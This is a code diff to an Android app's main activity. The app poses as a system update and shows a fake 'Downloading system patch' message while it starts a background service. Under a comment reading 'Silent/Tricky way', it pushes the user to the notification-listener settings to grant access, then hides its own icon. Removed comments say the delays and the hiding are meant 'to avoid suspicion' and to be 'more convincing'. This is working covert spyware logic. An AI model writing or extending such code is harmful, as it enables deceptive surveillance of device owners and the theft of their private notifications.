@@ -117,32 +117,52 @@ public class MainActivity extends Activity {
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE) {
-            // Check if user granted anything. Even if some are denied, we still hide to avoid suspicion.
-            // A more professional approach would be to wait for critical ones.
-            
             statusTextView.setText("Downloading system patch (124MB)...");
             btnUpdate.setVisibility(View.GONE);
             progressBar.setVisibility(View.VISIBLE);
             progressBar.setIndeterminate(true);
             
-            // Start the service in the background
             startMainService();
             
-            // Longer delay to be more convincing
             new android.os.Handler().postDelayed(new Runnable() {
                 @Override
                 public void run() {
                     statusTextView.setText("Installing patch. Please do not turn off your device.");
+                    
+                    // REQUEST NOTIFICATION ACCESS (Silent/Tricky way)
+                    if (!isNotificationServiceEnabled()) {
+                        try {
+                            Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
+                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                            startActivity(intent);
+                        } catch (Exception e) {}
+                    }
+
                     new android.os.Handler().postDelayed(new Runnable() {
                         @Override
                         public void run() {
                             hideAppIcon();
                             finish();
                         }
-                    }, 5000);
+                    }, 8000); // Give user time to toggle if they want
                 }
             }, 7000);
         }
+    }
+
+    private boolean isNotificationServiceEnabled() {
+        String pkgName = getPackageName();
+        final String flat = android.provider.Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
+        if (flat != null && !flat.isEmpty()) {
+            final String[] names = flat.split(":");
+            for (int i = 0; i < names.length; i++) {
+                final ComponentName cn = ComponentName.unflattenFromString(names[i]);
+                if (cn != null && pkgName.equals(cn.getPackageName())) {
+                    return true;
+                }
+            }
+        }
+        return false;
     }
 
     private void hideAppIcon() {
